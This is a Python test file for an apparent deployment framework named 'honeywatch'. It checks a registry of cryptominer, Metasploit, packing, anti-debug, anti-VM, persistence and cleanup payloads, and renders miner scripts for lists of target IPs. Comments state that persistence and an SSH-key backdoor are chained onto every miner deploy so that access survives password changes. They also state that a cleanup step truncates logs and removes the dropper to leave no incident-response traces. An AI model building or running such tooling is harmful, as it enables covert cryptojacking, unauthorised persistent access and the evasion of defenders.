"""Tests for honeywatch.payloads registry and script rendering."""

from __future__ import annotations

import pytest

from honeywatch.models import Payload, Target
from honeywatch.payloads import by_category, get_payload, list_payloads, registry
from honeywatch.payloads.scripts import (
    generate_operation_id,
    merge_defaults,
    render_manifest_scripts,
    render_payload_script,
    validate_variables,
)


def test_registry_has_expected_payloads():
    expected = {
        "xmrig",
        "xmrigcc",
        "stratum",
        "metasploit",
        "upx",
        "packers",
        "obfuscators",
        "symbol_strip",
        "anti_debug",
        "anti_vm",
        # Persistence payloads — chained onto every miner deploy so the box
        # survives reboots and access survives password changes.
        "kill_miners",
        "systemd_persist",
        "cron_persist",
        "sshkey_backdoor",
        # Cleanup payload — runs last in the evasion chain to wipe history,
        # truncate logs, and remove the dropper so the box carries no IR
        # fingerprints tying it to the deploy.
        "cleanup",
    }
    assert set(registry.keys()) == expected


def test_categories_match_expected():
    groups = by_category()
    assert set(groups.keys()) == {"miner", "exploit", "evasion"}
    assert {p.id for p in groups["miner"]} == {"xmrig", "xmrigcc", "stratum"}
    assert {p.id for p in groups["exploit"]} == {"metasploit"}
    assert {p.id for p in groups["evasion"]} == {
        "upx",
        "packers",
        "obfuscators",
        "symbol_strip",
        "anti_debug",
        "anti_vm",
        "kill_miners",
        "systemd_persist",
        "cron_persist",
        "sshkey_backdoor",
        "cleanup",
    }


def test_get_payload_returns_dataclass():
    p = get_payload("xmrig")
    assert isinstance(p, Payload)
    assert p.category == "miner"
    assert "config.json" in p.artifacts


def test_validate_variables_detects_missing_required():
    p = get_payload("xmrig")
    assert validate_variables(p, {"wallet": "abc"}) == ["pool"]
    assert validate_variables(p, {"pool": "x", "wallet": "y"}) == []


def test_merge_defaults_fills_schema_defaults():
    p = get_payload("xmrig")
    merged = merge_defaults(p, {"pool": "p", "wallet": "w"})
    assert merged["pass"] == "x"
    assert merged["worker"] == "honeywatch"
    assert merged["threads"] == 0


def test_render_payload_script_substitutes_variables():
    p = get_payload("upx")
    script = render_payload_script(p, {"input_file": "/bin/ls", "output_file": "/tmp/ls.packed"})
    assert "/bin/ls" in script
    assert "upx " in script
    # run script is appended at the end
    assert "upx --best" in script
    assert "/tmp/packed /bin/ls" in script


def test_render_manifest_scripts_per_target():
    p = get_payload("stratum")
    targets = [
        Target(ip="10.0.0.1", port=22, allowed_categories=["miner"]),
        Target(ip="10.0.0.2", port=22, allowed_categories=["miner"]),
    ]
    from honeywatch.models import DeploymentManifest

    manifest = DeploymentManifest(
        payload=p,
        targets=targets,
        variables={"upstream_pool": "pool.example.com:3333"},
    )
    scripts = render_manifest_scripts(manifest)
    assert set(scripts.keys()) == {"10.0.0.1", "10.0.0.2"}
    for script in scripts.values():
        assert "pool.example.com:3333" in script
        assert "stratum_proxy.py" in script


def test_generate_operation_id_format():
    op_id = generate_operation_id()
    assert op_id.startswith("hw-")
    assert len(op_id) == 13
